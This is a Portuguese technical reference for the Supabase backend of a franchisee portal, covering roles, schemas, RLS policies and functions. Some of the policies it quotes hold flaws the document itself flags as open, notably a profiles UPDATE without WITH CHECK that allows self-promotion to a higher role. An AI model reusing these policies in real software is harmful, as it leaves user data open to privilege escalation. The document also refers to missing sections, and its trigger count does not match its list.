# Backend Completo — Portal de Franqueados Delivery Much

> Documento de referência: estrutura, acessos, procedimentos e riscos do backend Supabase do Portal. Mantenha atualizado quando o schema mudar, quando uma migration for aplicada, ou quando um achado de segurança for remediado.
>
> **Última revisão:** 18/06/2026. **Projeto Supabase:** `gplxnzgsculryjykbcuo` (DM CRM, plano Free). **Stack:** Postgres + Supabase Auth + Storage + Edge Functions (Deno) + Next.js 16 (App Router) com `@supabase/ssr`.

---

## 1. Resumo executivo

O backend do Portal vive no Supabase. O domínio está modelado em **28 tabelas em `public`** + **1 tabela em `analytics`** + **2 buckets de Storage** (`comunicados`, privado; `calendarios-html`, público). Toda a autorização é feita por **RLS** em cima de um modelo de **3 roles** (`franqueado`, `equipe_dm`, `gestao`) definido em `public.profiles.role`. O frontend está em fase **frontend-first**: Auth, Calendário e Admin de Usuários já consomem o Supabase real; Comunicados, Helpdesk, Notificações, Materiais, FAQ e Links ainda vivem em mock + localStorage e serão migrados módulo por módulo. Existem **achados de segurança críticos abertos** (vide §11) que precisam ser tratados antes do portal ir para produção pública.

| Indicador | Valor |
|---|---|
| Schemas com tabelas do projeto | `public` (28), `analytics` (1), `storage` (gerenciado) |
| Buckets de Storage | 2 (`comunicados` privado; `calendarios-html` público) |
| Sequences | 1 (`tickets_codigo_seq` start 8000) |
| Funções Postgres | 11 (3 helpers RLS, 1 helper de path, 3 triggers, 4 de domínio) |
| Triggers ativos | 7 |
| Edge Functions deployadas | 2 (`admin_users`, `enviar_email_acesso`) |
| Roles do app | 3 (`franqueado`, `equipe_dm`, `gestao`) |
| Páginas autenticadas no portal | ~13 |
| Páginas admin | ~8 |
| Server Actions | 13 |
| Achados de segurança críticos abertos | 3 |
| Achados de severidade alta abertos | 6 |
| Tracking de migrations | dessincronizado (corrigir antes de `db push`) |
| Auth guard em rota | passthrough (`src/proxy.ts` não é executado pelo Next) |

---

## 2. Arquitetura do backend

### 2.1. Pilares

- **Postgres gerenciado pelo Supabase** — schema do domínio em `public`, métricas em `analytics`. Migrations versionadas em [`supabase/migrations/`](../supabase/migrations/).
- **Supabase Auth (GoTrue)** — e-mail + senha. Sem self-signup pela UI do portal. Auth real consumida em `/login`, `/esqueci-senha`, `/redefinir-senha`, `/trocar-senha`.
- **Supabase Storage** — dois buckets do projeto: `comunicados` (privado, para anexos do módulo Comunicados) e `calendarios-html` (público, para HTMLs auto-contidos do módulo Calendário).
- **Edge Functions (Deno)** — `admin_users` (CRUD de usuários, validado por role `gestao` + JWT) e `enviar_email_acesso` (SMTP via Google Workspace para senha provisória / redefinição).
- **Next.js (App Router)** — duas rotas de cliente Supabase: `src/lib/supabase/client.ts` (browser) e `src/lib/supabase/server.ts` (Server Components / Server Actions / Route Handlers), ambas com **anon key** (nunca service role).

### 2.2. Como o frontend conversa com o backend

| Caminho | Cliente | Onde |
|---|---|---|
| Server Component lê dados | `createClient()` server → PostgREST com cookie JWT | `src/app/(portal)/**/page.tsx` |
| Client Component lê dados | `createClient()` browser → PostgREST com cookie JWT | apenas em telas de Auth hoje |
| Server Action escreve dados | Server client + RLS do role do usuário | `src/app/.../actions.ts` |
| Operação administrativa (criar/excluir user) | Server Action → `fetch` para Edge Function `admin_users` com `Authorization: Bearer <JWT-do-gestor>` | `src/app/(portal)/admin/usuarios/actions.ts` |
| Telemetria | Server Action `rastrear()` → INSERT em `analytics.fct_eventos` | `src/lib/analytics/track.ts` |
| Upload de HTML do Calendário | Server Action → Storage bucket `calendarios-html` | `src/app/(portal)/admin/calendarios/actions.ts` |
| Renderização pública do Calendário | Route Handler `/api/calendarios/[slug]` proxia HTML do bucket | `src/app/api/calendarios/[slug]/route.ts` |

### 2.3. Fluxo padrão de uma operação privilegiada (criar usuário)

```
Browser (gestor logado)
  → Server Action criarUsuarioAction
    → createClient() server (anon key + JWT em cookie)
    → SELECT profiles.role → confere == 'gestao'
    → auth.getSession() → extrai access_token
    → fetch Edge Function admin_users
       Authorization: Bearer <JWT-do-gestor>
  → Edge Function (Deno, isolado)
    → admin.auth.getUser(jwt) revalida assinatura
    → SELECT profiles.role com service role → confere == 'gestao'
    → admin.auth.admin.createUser(...)  // service role
    → upsert em public.profiles (role, senha_provisoria = TRUE)
    → INSERT em public.franqueado_franquias (se franqueado)
    → invoca enviar_email_acesso (best-effort)
  → resposta { ok, user_id }
```

A **service role nunca entra no Next.js** — vive apenas dentro das Edge Functions (`Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')`).

---

## 3. Modelo de 3 roles — fundamental

O modelo de autorização gira em torno de **três valores** em `public.profiles.role`, validados pelo CHECK constraint:

```sql
role TEXT NOT NULL CHECK (role IN ('franqueado', 'equipe_dm', 'gestao'))
```

### 3.1. As três roles

| Role | Quem é | Como é definido | Visão padrão |
|---|---|---|---|
| `franqueado` | Lojista da rede | Atribuído por trigger `handle_new_user` no signup (default) ou via Edge Function `admin_users` | Apenas dados das franquias vinculadas via `public.franqueado_franquias` |
| `equipe_dm` | Funcionário interno DM, segmentado por `departamento` (marketing, financeiro, tecnologia, jurídico, operacional) | Promovido via UPDATE em `profiles` por gestão (ou Edge Function admin) | Visão ampla (lê tudo na rede); poder de criar/editar conteúdo (Comunicados, Materiais, Calendários, FAQ, Links); no Suporte só age sobre departamentos onde figura em `departamentos_responsaveis` |
| `gestao` | Nível máximo — direção da rede | Único role autorizado a gerenciar franquias, vínculos franqueado×franquia, categorias de comunicado, departamentos de suporte e exclusões críticas (DELETE de comunicados e tickets) | Tudo |

### 3.2. Como o role é obtido em runtime

A função base usada por todas as policies RLS:

```sql
CREATE OR REPLACE FUNCTION public.get_user_role()
RETURNS TEXT
LANGUAGE sql
STABLE
SECURITY DEFINER
SET search_path = public
AS $$
  SELECT role FROM public.profiles WHERE id = auth.uid();
$$;
```

E o helper de franquias vinculadas (para o role `franqueado`):

```sql
CREATE OR REPLACE FUNCTION public.get_user_franquia_ids()
RETURNS UUID[]
LANGUAGE sql
STABLE
SECURITY DEFINER
SET search_path = public
AS $$
  SELECT COALESCE(ARRAY_AGG(franquia_id), '{}')
  FROM public.franqueado_franquias
  WHERE user_id = auth.uid();
$$;
```

Ambas têm `REVOKE EXECUTE FROM anon, authenticated, public` — não podem ser invocadas via `/rest/v1/rpc`, apenas embutidas dentro das policies (que rodam como o owner via SECURITY DEFINER).

### 3.3. Como o frontend lê o role

Helper "oficial" em [`src/lib/portal-profile.ts`](../src/lib/portal-profile.ts):

```typescript
carregarPortalProfile(): Promise<PortalProfile | null>
// faz auth.getUser() + SELECT em profiles + RPC get_user_franquia_ids
// retorna { id, nome, email, role, departamento, franquia_ids, senha_provisoria }
```

Convenção: **nunca confiar em metadata do JWT** — sempre `auth.getUser()` + `SELECT profiles.role`. O role é propagado para Client Components via prop (após validação server-side).

---

## 4. Schema completo

Cada tabela está descrita com colunas, FKs, índices, triggers e **as policies RLS literais**. Quando uma policy não tem `WITH CHECK`, isso está explícito (e tipicamente é um achado documentado em §11).

### 4.1. `public.profiles`

Estende `auth.users` 1:1. Carrega role, departamento, flag de senha provisória.

| Coluna | Tipo | Null | Default | Notas |
|---|---|---|---|---|
| `id` | UUID | NOT NULL | — | PK; FK → `auth.users(id)` ON DELETE CASCADE |
| `nome` | TEXT | NOT NULL | — | — |
| `email` | TEXT | NOT NULL | — | sem UNIQUE — ver §12 |
| `role` | TEXT | NOT NULL | — | CHECK `IN ('franqueado','equipe_dm','gestao')` |
| `departamento` | TEXT | NULL | — | usado por `equipe_dm` |
| `avatar_url` | TEXT | NULL | — | — |
| `ativo` | BOOLEAN | NOT NULL | TRUE | — |
| `created_at` | TIMESTAMPTZ | NOT NULL | NOW() | — |
| `updated_at` | TIMESTAMPTZ | NOT NULL | NOW() | sem trigger automático |
| `senha_provisoria` | BOOLEAN | NOT NULL | FALSE | adicionada em `20260528030000` |

**RLS:** habilitado. **Sem policy de INSERT** (criação só via trigger SECURITY DEFINER em `auth.users`). **Sem policy de DELETE**.

```sql
CREATE POLICY "usuario lê próprio perfil ou gestao/equipe_dm lê todos"
  ON public.profiles FOR SELECT
  USING (id = auth.uid() OR get_user_role() IN ('gestao', 'equipe_dm'));

CREATE POLICY "usuario atualiza próprio perfil"
  ON public.profiles FOR UPDATE
  USING (id = auth.uid());
-- ATENÇÃO: SEM WITH CHECK — vetor de auto-promoção. Ver §11.
```

### 4.2. `public.franquias`

| Coluna | Tipo | Default |
|---|---|---|
| `id` UUID PK | — | `uuid_generate_v4()` |
| `nome` TEXT NOT NULL | — | — |
| `cnpj` TEXT UNIQUE | NULL | — |
| `cidade` TEXT NOT NULL | — | — |
| `estado` CHAR(2) NOT NULL | — | — |
| `regiao` TEXT | NULL | — |
| `ativa` BOOLEAN NOT NULL | — | TRUE |
| `created_at`, `updated_at` TIMESTAMPTZ NOT NULL | — | NOW() |

```sql
CREATE POLICY "franqueado vê suas franquias; gestao/equipe_dm vê todas"
  ON public.franquias FOR SELECT
  USING (get_user_role() IN ('gestao','equipe_dm') OR id = ANY(get_user_franquia_ids()));

CREATE POLICY "somente gestao cria franquias"
  ON public.franquias FOR INSERT
  WITH CHECK (get_user_role() = 'gestao');

CREATE POLICY "somente gestao edita franquias"
  ON public.franquias FOR UPDATE
  USING (get_user_role() = 'gestao');
-- sem WITH CHECK explícito; sem policy DELETE
```

### 4.3. `public.franqueado_franquias`

Junção M:N usuário↔franquia.

| Coluna | Tipo | Notas |
|---|---|---|
| `user_id` UUID NOT NULL | FK → `auth.users(id)` ON DELETE CASCADE | |
| `franquia_id` UUID NOT NULL | FK → `public.franquias(id)` ON DELETE CASCADE | |
| `created_at` TIMESTAMPTZ NOT NULL DEFAULT NOW() | | |

PK composta `(user_id, franquia_id)`.

```sql
CREATE POLICY "franqueado vê próprios vínculos; gestao/equipe_dm vê todos"
  ON public.franqueado_franquias FOR SELECT
  USING (user_id = auth.uid() OR get_user_role() IN ('gestao','equipe_dm'));

CREATE POLICY "somente gestao gerencia vínculos"
  ON public.franqueado_franquias FOR ALL
  USING (get_user_role() = 'gestao');
-- ATENÇÃO: FOR ALL sem WITH CHECK — INSERT bloqueia para gestao via authenticated. Ver §12.
```

### 4.4. `public.comunicados`

| Coluna | Tipo | Default / CHECK |
|---|---|---|
| `id` UUID PK | — | `uuid_generate_v4()` |
| `titulo` TEXT NOT NULL | CHECK `char_length BETWEEN 1 AND 255` | |
| `conteudo_html` TEXT NOT NULL | — | — |
| `status` TEXT NOT NULL | DEFAULT `'rascunho'`; CHECK `IN ('rascunho','publicado','agendado','arquivado')` | |
| `visibilidade` TEXT NOT NULL | DEFAULT `'todos'`; CHECK `IN ('todos','especifico')` | |
| `criado_por` UUID NOT NULL | FK → `auth.users(id)` — sem ON DELETE | |
| `publicado_em`, `agendado_para` TIMESTAMPTZ | NULL | |
| `created_at`, `updated_at` TIMESTAMPTZ | NOW() | |
| `descricao` TEXT NOT NULL DEFAULT `''` | CHECK `char_length <= 500` | |
| `banner_destaque` BOOLEAN NOT NULL DEFAULT FALSE | | |
| `notificar_email` BOOLEAN NOT NULL DEFAULT TRUE | ver §12 | |

```sql
CREATE POLICY "franqueado vê comunicados publicados para ele"
  ON public.comunicados FOR SELECT
  USING (
    get_user_role() IN ('gestao','equipe_dm')
    OR (
      status = 'publicado'
      AND (
        visibilidade = 'todos'
        OR id IN (
          SELECT comunicado_id FROM public.comunicado_franquias
          WHERE franquia_id = ANY(get_user_franquia_ids())
        )
      )
    )
  );

CREATE POLICY "gestao e equipe_dm criam comunicados"
  ON public.comunicados FOR INSERT
  WITH CHECK (get_user_role() IN ('gestao','equipe_dm'));

CREATE POLICY "gestao e equipe_dm editam comunicados"
  ON public.comunicados FOR UPDATE
  USING (get_user_role() IN ('gestao','equipe_dm'));
-- sem WITH CHECK

CREATE POLICY "somente gestao remove comunicados"
  ON public.comunicados FOR DELETE
  USING (get_user_role() = 'gestao');
```

### 4.5. `public.comunicado_franquias`

Visibilidade granular comunicado×franquia. PK composta. RLS habilitado **com policy** (corrigido em `20260514000000`).

```sql
CREATE POLICY "lê vínculo de franquia se vê o comunicado"
  ON public.comunicado_franquias FOR SELECT
  USING (get_user_role() IN ('gestao','equipe_dm') OR franquia_id = ANY(get_user_franquia_ids()));

CREATE POLICY "gestao e equipe_dm gerenciam vínculos de comunicado"
  ON public.comunicado_franquias FOR ALL
  USING (get_user_role() IN ('gestao','equipe_dm'))
  WITH CHECK (get_user_role() IN ('gestao','equipe_dm'));
```

### 4.6. `public.comunicado_categorias`

| Coluna | Tipo | CHECK |
|---|---|---|
| `id` UUID PK | DEFAULT `uuid_generate_v4()` | — |
| `nome` TEXT NOT NULL | CHECK `char_length BETWEEN 1 AND 60` | — |
| `cor` TEXT NOT NULL | CHECK `cor ~ '^#[0-9A-Fa-f]{6}$'` | — |
| `icone` TEXT NOT NULL | Material Symbol | — |
| `ordem` INT NOT NULL DEFAULT 0 | — | — |
| `ativo` BOOLEAN NOT NULL DEFAULT TRUE | — | — |
| `criado_por` UUID | FK → `auth.users(id)` | NULL ok |
| `created_at` TIMESTAMPTZ NOT NULL DEFAULT NOW() | | |

Seeds: 6 categorias (Gestão, Marketing, Financeiro, Tecnologia, Jurídico, Novidades).

```sql
CREATE POLICY "todos autenticados leem categorias"
  ON public.comunicado_categorias FOR SELECT USING (auth.uid() IS NOT NULL);

CREATE POLICY "somente gestao gerencia categorias"
  ON public.comunicado_categorias FOR ALL
  USING (get_user_role() = 'gestao')
  WITH CHECK (get_user_role() = 'gestao');
```

### 4.7. `public.comunicado_categoria_rel`

Junção M:N comunicado↔categoria. PK composta.

```sql
CREATE POLICY "lê rel categoria se vê comunicado"
  ON public.comunicado_categoria_rel FOR SELECT
  USING (pode_ver_comunicado(comunicado_id));

CREATE POLICY "gestao e equipe_dm gerenciam rel categoria"
  ON public.comunicado_categoria_rel FOR ALL
  USING (get_user_role() IN ('gestao','equipe_dm'))
  WITH CHECK (get_user_role() IN ('gestao','equipe_dm'));
```

### 4.8. `public.comunicado_anexos`

Anexos do comunicado (URLs relativas ao bucket `comunicados`).

```sql
CREATE POLICY "lê anexos se vê comunicado"
  ON public.comunicado_anexos FOR SELECT
  USING (pode_ver_comunicado(comunicado_id));

CREATE POLICY "gestao e equipe_dm gerenciam anexos"
  ON public.comunicado_anexos FOR ALL
  USING (get_user_role() IN ('gestao','equipe_dm'))
  WITH CHECK (get_user_role() IN ('gestao','equipe_dm'));
```

### 4.9. `public.comunicado_leituras`

| Coluna | Tipo | CHECK |
|---|---|---|
| `id` UUID PK | — | — |
| `comunicado_id` UUID NOT NULL | FK ON DELETE CASCADE | — |
| `user_id` UUID NOT NULL | FK ON DELETE CASCADE | — |
| `primeiro_acesso`, `ultimo_acesso` TIMESTAMPTZ NOT NULL DEFAULT NOW() | | |
| `visualizacoes` INT NOT NULL DEFAULT 1 | | |
| `reacao` TEXT NULL | CHECK `IN (NULL, 'like','love','idea','rocket','dislike')` | |

UNIQUE `(comunicado_id, user_id)`.

```sql
CREATE POLICY "usuário lê própria leitura; gestão/equipe_dm leem todas"
  ON public.comunicado_leituras FOR SELECT
  USING (user_id = auth.uid() OR get_user_role() IN ('gestao','equipe_dm'));

CREATE POLICY "usuário grava própria leitura"
  ON public.comunicado_leituras FOR INSERT
  WITH CHECK (user_id = auth.uid() AND pode_ver_comunicado(comunicado_id));

CREATE POLICY "usuário atualiza própria leitura"
  ON public.comunicado_leituras FOR UPDATE
  USING (user_id = auth.uid()) WITH CHECK (user_id = auth.uid());
-- sem policy DELETE (inconsistência com comunicado_reacoes — ver §12)
```

### 4.10. `public.comunicado_reacoes`

Histórico de reações. UNIQUE `(comunicado_id, user_id)`.

```sql
CREATE POLICY "usuário lê própria reação; gestão/equipe_dm leem todas"
  ON public.comunicado_reacoes FOR SELECT
  USING (user_id = auth.uid() OR get_user_role() IN ('gestao','equipe_dm'));

CREATE POLICY "usuário registra própria reação"
  ON public.comunicado_reacoes FOR INSERT
  WITH CHECK (user_id = auth.uid() AND pode_ver_comunicado(comunicado_id));

CREATE POLICY "usuário atualiza própria reação"
  ON public.comunicado_reacoes FOR UPDATE
  USING (user_id = auth.uid()) WITH CHECK (user_id = auth.uid());

CREATE POLICY "usuário remove própria reação"
  ON public.comunicado_reacoes FOR DELETE
  USING (user_id = auth.uid());
```

### 4.11. `public.materiais_pastas`

Pastas hierárquicas (auto-referência via `parent_id`).

```sql
CREATE POLICY "todos autenticados veem pastas"
  ON public.materiais_pastas FOR SELECT USING (auth.uid() IS NOT NULL);

CREATE POLICY "gestao e equipe_dm gerenciam pastas"
  ON public.materiais_pastas FOR ALL
  USING (get_user_role() IN ('gestao','equipe_dm'));
-- FOR ALL sem WITH CHECK
```

### 4.12. `public.materiais`

```sql
CREATE POLICY "franqueado vê materiais disponíveis para ele"
  ON public.materiais FOR SELECT
  USING (
    get_user_role() IN ('gestao','equipe_dm')
    OR visibilidade = 'todos'
    OR id IN (
      SELECT material_id FROM public.material_franquias
      WHERE franquia_id = ANY(get_user_franquia_ids())
    )
  );

CREATE POLICY "gestao e equipe_dm gerenciam materiais"
  ON public.materiais FOR ALL
  USING (get_user_role() IN ('gestao','equipe_dm'));
-- sem WITH CHECK
```

### 4.13. `public.material_franquias` ⚠️

PK `(material_id, franquia_id)`. **RLS habilitado SEM nenhuma policy** — deny-all (advisor INFO aberto). A subquery na policy de `materiais` portanto retorna vazio para `franqueado` em visibilidade `'especifico'`. Ver §11.

### 4.14. `public.calendario_eventos`

Eventos do calendário **legado** (anterior ao módulo `calendarios_html`).

```sql
CREATE POLICY "franqueado vê eventos para ele"
  ON public.calendario_eventos FOR SELECT
  USING (
    get_user_role() IN ('gestao','equipe_dm')
    OR visibilidade = 'todos'
    OR id IN (
      SELECT evento_id FROM public.evento_franquias
      WHERE franquia_id = ANY(get_user_franquia_ids())
    )
  );

CREATE POLICY "gestao e equipe_dm gerenciam eventos"
  ON public.calendario_eventos FOR ALL
  USING (get_user_role() IN ('gestao','equipe_dm'));
```

### 4.15. `public.evento_franquias` ⚠️

Mesmo problema de `material_franquias`: **RLS habilitado sem policy** (advisor INFO).

### 4.16. `public.faq_categorias`

5 categorias seed (Tecnologia, Marketing, Financeiro, Jurídico, Operacional).

```sql
CREATE POLICY "todos autenticados veem categorias faq"
  ON public.faq_categorias FOR SELECT USING (auth.uid() IS NOT NULL);

CREATE POLICY "gestao e equipe_dm gerenciam categorias faq"
  ON public.faq_categorias FOR ALL
  USING (get_user_role() IN ('gestao','equipe_dm'));
```

### 4.17. `public.faq_perguntas`

```sql
CREATE POLICY "todos autenticados veem perguntas ativas"
  ON public.faq_perguntas FOR SELECT
  USING (auth.uid() IS NOT NULL AND (ativo = TRUE OR get_user_role() IN ('gestao','equipe_dm')));

CREATE POLICY "gestao e equipe_dm gerenciam perguntas faq"
  ON public.faq_perguntas FOR ALL
  USING (get_user_role() IN ('gestao','equipe_dm'));
```

### 4.18. `public.links_atalhos`

5 seeds (DataMuch, Eugênio Web, Painel Marketplace, Instagram, Facebook).

```sql
CREATE POLICY "franqueado vê links ativos disponíveis para ele"
  ON public.links_atalhos FOR SELECT
  USING (
    ativo = TRUE
    AND (
      get_user_role() IN ('gestao','equipe_dm')
      OR visibilidade = 'todos'
      OR id IN (
        SELECT link_id FROM public.link_franquias
        WHERE franquia_id = ANY(get_user_franquia_ids())
      )
    )
  );

CREATE POLICY "gestao e equipe_dm gerenciam links"
  ON public.links_atalhos FOR ALL
  USING (get_user_role() IN ('gestao','equipe_dm'));
```

### 4.19. `public.link_franquias` ⚠️

**RLS habilitado sem policy** (advisor INFO).

### 4.20. `public.departamentos_suporte`

12 seeds (Tecnologia, Pague no App, Lojas Parceiras, Problemas no Pedido, Minha Franquia | Financeiro, Marketing, Operações, Acessos, Novas Cidades, DM Supermercado, Solicitação de Relatório, Cadastro de Novos Estabelecimentos).

```sql
CREATE POLICY "todos autenticados leem departamentos"
  ON public.departamentos_suporte FOR SELECT USING (auth.uid() IS NOT NULL);

CREATE POLICY "somente gestao gerencia departamentos"
  ON public.departamentos_suporte FOR ALL
  USING (get_user_role() = 'gestao')
  WITH CHECK (get_user_role() = 'gestao');
```

Trigger `tg_departamentos_suporte_updated_at` mantém `updated_at`.

### 4.21. `public.departamentos_responsaveis`

PK `(departamento_id, profile_id)`; coluna `papel` CHECK `IN ('responsavel','backup')`.

```sql
CREATE POLICY "todos autenticados leem responsaveis"
  ON public.departamentos_responsaveis FOR SELECT USING (auth.uid() IS NOT NULL);

CREATE POLICY "somente gestao gerencia responsaveis"
  ON public.departamentos_responsaveis FOR ALL
  USING (get_user_role() = 'gestao')
  WITH CHECK (get_user_role() = 'gestao');
```

### 4.22. `public.formulario_campos`

Form builder por departamento. CHECK `tipo IN ('texto','textarea','select','data','anexo','numero')`. `opcoes` JSONB.

```sql
CREATE POLICY "todos autenticados leem campos do formulario"
  ON public.formulario_campos FOR SELECT USING (auth.uid() IS NOT NULL);

CREATE POLICY "gestao ou responsavel gerenciam campos"
  ON public.formulario_campos FOR ALL
  USING (
    get_user_role() = 'gestao'
    OR (get_user_role() = 'equipe_dm' AND public.eh_responsavel_departamento(departamento_id))
  )
  WITH CHECK (
    get_user_role() = 'gestao'
    OR (get_user_role() = 'equipe_dm' AND public.eh_responsavel_departamento(departamento_id))
  );
```

### 4.23. `public.sla_configuracoes`

UNIQUE `(departamento_id, prioridade)`. CHECK `prioridade IN ('baixa','normal','alta','critica')`. 48 seeds (12 × 4).

| prioridade | primeira_resposta_horas | resolucao_horas |
|---|---|---|
| baixa | 8 | 72 |
| normal | 4 | 24 |
| alta | 2 | 8 |
| critica | 1 | 4 |

Policies idênticas a `formulario_campos` (responsável gerencia o seu).

### 4.24. `public.tickets`

| Coluna | Tipo | Notas |
|---|---|---|
| `id` UUID PK | DEFAULT `uuid_generate_v4()` | |
| `codigo` TEXT NOT NULL UNIQUE | gerado por trigger `'DM-' || nextval(tickets_codigo_seq)` (start 8000) | |
| `franqueado_id` UUID NOT NULL | FK → `profiles(id)` ON DELETE RESTRICT | |
| `franquia_id` UUID NOT NULL | FK → `franquias(id)` ON DELETE RESTRICT | |
| `departamento_id` UUID NOT NULL | FK → `departamentos_suporte(id)` ON DELETE RESTRICT | |
| `responsavel_id` UUID | FK → `profiles(id)` — sem ON DELETE | |
| `assunto` TEXT NOT NULL | | |
| `prioridade` TEXT NOT NULL DEFAULT `'normal'` | CHECK `IN ('baixa','normal','alta','critica')` | |
| `status` TEXT NOT NULL DEFAULT `'aberto'` | CHECK `IN ('aberto','pendente','em_espera','resolvido')` | |
| `respostas` JSONB NOT NULL DEFAULT `'{}'` | payload do form dinâmico | |
| `zendesk_ticket_id`, `zendesk_url` TEXT | NULL | |
| `created_at`, `updated_at`, `resolvido_em` TIMESTAMPTZ | | |

```sql
CREATE POLICY "ve tickets conforme escopo"
  ON public.tickets FOR SELECT
  USING (
    get_user_role() = 'gestao'
    OR (get_user_role() = 'equipe_dm' AND public.eh_responsavel_departamento(departamento_id))
    OR (get_user_role() = 'franqueado' AND franquia_id = ANY(get_user_franquia_ids()))
  );

CREATE POLICY "abre tickets conforme escopo"
  ON public.tickets FOR INSERT
  WITH CHECK (
    (get_user_role() = 'franqueado'
      AND franqueado_id = auth.uid()
      AND franquia_id = ANY(get_user_franquia_ids()))
    OR get_user_role() IN ('equipe_dm','gestao')
  );

CREATE POLICY "atualiza tickets conforme escopo"
  ON public.tickets FOR UPDATE
  USING (
    get_user_role() = 'gestao'
    OR (get_user_role() = 'equipe_dm' AND public.eh_responsavel_departamento(departamento_id))
    OR (get_user_role() = 'franqueado' AND franqueado_id = auth.uid() AND franquia_id = ANY(get_user_franquia_ids()))
  )
  WITH CHECK ( mesma expressão );

CREATE POLICY "somente gestao remove tickets"
  ON public.tickets FOR DELETE
  USING (get_user_role() = 'gestao');
```

> ⚠️ A policy de UPDATE permite franqueado mexer em qualquer coluna do próprio ticket (status, prioridade, departamento, respostas, zendesk_url). Achado documentado em §11.

### 4.25. `public.ticket_mensagens`

Thread. `origem TEXT NOT NULL DEFAULT 'portal' CHECK IN ('portal','zendesk')`. `interna BOOLEAN NOT NULL DEFAULT FALSE`. **Sem policy de UPDATE ou DELETE** (mensagens imutáveis por design de auditoria).

```sql
CREATE POLICY "le mensagens conforme escopo"
  ON public.ticket_mensagens FOR SELECT
  USING (
    public.pode_ver_ticket(ticket_id)
    AND (get_user_role() IN ('gestao','equipe_dm') OR interna = FALSE)
  );

CREATE POLICY "insere mensagem conforme escopo"
  ON public.ticket_mensagens FOR INSERT
  WITH CHECK (
    public.pode_responder_ticket(ticket_id)
    AND origem = 'portal'
    AND (
      get_user_role() IN ('gestao','equipe_dm')
      OR (get_user_role() = 'franqueado' AND autor_id = auth.uid() AND interna = FALSE)
    )
  );
```

### 4.26. `public.ticket_anexos`

`url` aponta para Zendesk (decisão de produto — Storage do Supabase **não** recebe esses anexos). Sem UPDATE/DELETE policies.

```sql
CREATE POLICY "le anexos conforme escopo"
  ON public.ticket_anexos FOR SELECT
  USING (
    public.pode_ver_ticket(ticket_id)
    AND (
      mensagem_id IS NULL
      OR get_user_role() IN ('gestao','equipe_dm')
      OR EXISTS (
        SELECT 1 FROM public.ticket_mensagens m
        WHERE m.id = mensagem_id AND m.interna = FALSE
      )
    )
  );

CREATE POLICY "insere anexo conforme escopo"
  ON public.ticket_anexos FOR INSERT
  WITH CHECK (public.pode_responder_ticket(ticket_id));
```

### 4.27. `public.calendarios_html`

Calendário HTML auto-contido. Único ativo via partial unique index.

| Coluna | CHECK |
|---|---|
| `titulo` TEXT NOT NULL | `char_length BETWEEN 1 AND 255` |
| `slug` TEXT NOT NULL UNIQUE | `char_length BETWEEN 1 AND 120` + `slug ~ '^[a-z0-9]+(?:-[a-z0-9]+)*$'` |
| `html_path` TEXT NOT NULL | path no bucket `calendarios-html` |
| `ativo` BOOLEAN NOT NULL DEFAULT FALSE | partial unique `WHERE ativo = TRUE` |
| `criado_por_id` UUID | FK → `profiles(id)` ON DELETE SET NULL |

```sql
CREATE POLICY "todos autenticados leem calendarios_html"
  ON public.calendarios_html FOR SELECT USING (auth.uid() IS NOT NULL);

CREATE POLICY "equipe_dm e gestao criam calendarios_html"
  ON public.calendarios_html FOR INSERT
  WITH CHECK (public.get_user_role() IN ('equipe_dm','gestao'));

CREATE POLICY "equipe_dm e gestao atualizam calendarios_html"
  ON public.calendarios_html FOR UPDATE
  USING (public.get_user_role() IN ('equipe_dm','gestao'))
  WITH CHECK (public.get_user_role() IN ('equipe_dm','gestao'));

CREATE POLICY "equipe_dm e gestao removem calendarios_html"
  ON public.calendarios_html FOR DELETE
  USING (public.get_user_role() IN ('equipe_dm','gestao'));
```

> Trocar o ativo **sempre** via função `public.ativar_calendario(uuid)` — UPDATE direto viola o partial unique index durante a transição.

### 4.28. `analytics.fct_eventos`

Event sourcing leve. PII: `user_id`. **Imutável** (sem UPDATE/DELETE policies).

| Coluna | Tipo |
|---|---|
| `id` UUID PK DEFAULT `gen_random_uuid()` | — |
| `evento` TEXT NOT NULL | snake_case + verbo no passado |
| `user_id` UUID | FK → `profiles(id)` ON DELETE SET NULL |
| `role` TEXT | snapshot |
| `payload` JSONB | propriedades específicas |
| `ocorreu_em` TIMESTAMPTZ NOT NULL DEFAULT NOW() | |

Índices: `evento`, `user_id`, `ocorreu_em` (btree) + `payload` GIN.

```sql
GRANT USAGE ON SCHEMA analytics TO authenticated;
GRANT INSERT, SELECT ON analytics.fct_eventos TO authenticated;

CREATE POLICY "usuario autenticado grava evento em nome próprio"
  ON analytics.fct_eventos FOR INSERT
  WITH CHECK (user_id = auth.uid());

CREATE POLICY "somente gestao lê eventos"
  ON analytics.fct_eventos FOR SELECT
  USING (public.get_user_role() = 'gestao');
```

### 4.29. Funções do projeto

| Função | Tipo | Propósito |
|---|---|---|
| `public.get_user_role()` | sql STABLE SECURITY DEFINER | role do user corrente |
| `public.get_user_franquia_ids()` | sql STABLE SECURITY DEFINER | UUID[] das franquias vinculadas |
| `public.handle_new_user()` | plpgsql SECURITY DEFINER (trigger) | cria `profiles` ao inserir em `auth.users` |
| `public.pode_ver_comunicado(uuid)` | sql STABLE SECURITY DEFINER | reuso da regra de leitura |
| `public.comunicado_id_de_path(text)` | sql IMMUTABLE | extrai UUID do path do Storage |
| `public.tg_set_updated_at()` | plpgsql trigger | mantém `updated_at` |
| `public.tg_tickets_gera_codigo()` | plpgsql trigger | preenche `'DM-' || nextval(seq)` |
| `public.eh_responsavel_departamento(uuid)` | sql STABLE SECURITY DEFINER | True se user é responsável/backup |
| `public.pode_ver_ticket(uuid)` | sql STABLE SECURITY DEFINER | gate de leitura de ticket |
| `public.pode_responder_ticket(uuid)` | sql STABLE SECURITY DEFINER | gate de escrita em ticket |
| `public.ativar_calendario(uuid)` | plpgsql SECURITY **INVOKER** | troca atômica do calendário ativo; gate manual de role |

`REVOKE EXECUTE FROM anon, authenticated, public` aplicado nas SECURITY DEFINER usadas em policies — não podem ser chamadas via RPC, apenas embutidas.

### 4.30. Triggers

| Trigger | Tabela | Quando | Função |
|---|---|---|---|
| `on_auth_user_created` | `auth.users` | AFTER INSERT | `handle_new_user()` |
| `tg_departamentos_suporte_updated_at` | `departamentos_suporte` | BEFORE UPDATE | `tg_set_updated_at()` |
| `tg_formulario_campos_updated_at` | `formulario_campos` | BEFORE UPDATE | `tg_set_updated_at()` |
| `tg_sla_configuracoes_updated_at` | `sla_configuracoes` | BEFORE UPDATE | `tg_set_updated_at()` |
| `tg_tickets_gera_codigo_before_insert` | `tickets` | BEFORE INSERT | `tg_tickets_gera_codigo()` |
| `tg_tickets_updated_at` | `tickets` | BEFORE UPDATE | `tg_set_updated_at()` |
